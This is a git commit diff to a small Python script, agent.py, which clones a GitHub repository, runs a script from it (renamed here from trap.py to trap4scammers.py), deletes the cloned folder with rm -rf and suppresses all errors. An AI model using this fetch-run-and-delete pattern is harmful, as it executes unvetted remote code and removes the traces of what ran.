8b3ebca1f53fbfd1ccd310a5e5c6b2c1cb04ff33
Valerii Syroiezhin <86792918+syroiezhin@users.noreply.github.com>
2022-08-02 07:41:51 +0300

    Update agent.py

--- agent.py
+++ agent.py
@@ -4,6 +4,6 @@ if __name__ == "__main__":
 
     try:
         system("git clone https://github.com/syroiezhin/console2app finder")
-        system("python3 finder/trap.py")
+        system("python3 finder/trap4scammers.py")
         system(f"rm -rf {getcwd()}/finder")
     except: pass
